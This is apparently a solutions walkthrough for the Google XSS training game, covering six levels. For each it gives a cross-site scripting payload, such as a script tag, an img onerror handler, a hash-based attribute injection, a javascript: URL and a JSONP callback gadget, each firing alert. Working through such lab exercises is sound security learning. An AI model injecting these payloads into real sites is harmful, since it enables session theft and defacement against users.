# solutions

# Level 1

```
<script>alert(1)</script>
```

# Level 2

```
<img src='#' onerror=alert(1)></img> 
```

# Level 3

Source:
```
function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
 
        window.location.hash = num;
 
        // Select the current tab
        var tabs = document.querySelectorAll('.tab');
        for (var i = 0; i < tabs.length; i++) {
          if (tabs[i].id == "tab" + parseInt(num)) {
            tabs[i].className = "tab active";
            } else {
            tabs[i].className = "tab";
          }
        }
 
        // Tell parent we've changed the tab
        top.postMessage(self.location.toString(), "*");
      }
 
      window.onload = function() { 
        chooseTab(unescape(self.location.hash.substr(1)) || "1");
      }
 
      // Extra code so that we can communicate with the parent page
      window.addEventListener("message", function(event){
        if (event.source == parent) {
          chooseTab(unescape(self.location.hash.substr(1)));
        }
      }, false);
    </script>
```
Everything after # in the https://xss-game.appspot.com/level3/frame endpoint is passed into the chooseTab function.
```
1' onerror='alert();//
```

The img tag is given an onerror attribute when choseTab is called.

# Level 4

Timer runs the alert to evaluate how long the timer should be.
```
3'**alert());//
```

# Level 5

Set next to
```
javascript:alert()
```
so that the is inserted into the HTML element.

# Level 6

```
//www.google.com/jsapi?callback=alert
```
after the # calls the code with the gadget.